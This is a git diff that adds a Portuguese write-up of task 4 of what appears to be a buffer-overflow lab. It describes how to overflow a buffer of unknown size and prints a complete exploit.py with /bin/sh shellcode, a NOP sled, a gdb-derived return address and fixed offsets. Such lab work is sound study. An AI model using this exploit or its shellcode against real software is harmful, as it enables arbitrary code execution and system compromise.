@@ -137,14 +137,48 @@ Para finalizar corremos o script python e depois corremos o programa.Com isto co
 
 
 
-
-
-
-
-
-
 ## TAREFA 4
+Nesta task o objetivo é bastante semelhante ao anterior, mas o tamanho inicial do **buffer** é desconhecido. 
 
+Sabemos que o buffer pode ter entre 100 a 200 bytes e não é podemos utilizar uma abordagem de força bruta para determinar seu tamanho exato. Portanto, para garantir que nosso exploit funcione para qualquer tamanho de buffer dentro desse intervalo, devemos posicionar o shellcode após o tamanho máximo do buffer.
 
+Na tarefa anterior o return address econtrava-se a 12 bytes após o final do *buffer* (100 + 12). Logo, se preenchermos as posições 112 a 212 do buffer com o return address que pretendemos, qualquer buffer com o tamanho contido no intervalo indicado encontrará o return address em `ebp`.
+
+Ao utilizar o depurador gdb, confirmamos que o endereço base do buffer é `0xffffcaa0`, o que significa que o espaço de memória após o buffer começa em `0xffffcb0c`.
+
+Com base nessas informações e assumindo valores arbitrários de 240 como o início do shellcode e 220 como o offset do return address, o script exploit.py pode ser formulado da seguinte maneira:
+
+```py
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 240               # Change this number
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value
+# and put it somewhere in the payload
+ret    = 0xffffcb0c   # Change this number
+offset = 220           # Change this number
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+    f.write(content)
+```` 
 
 
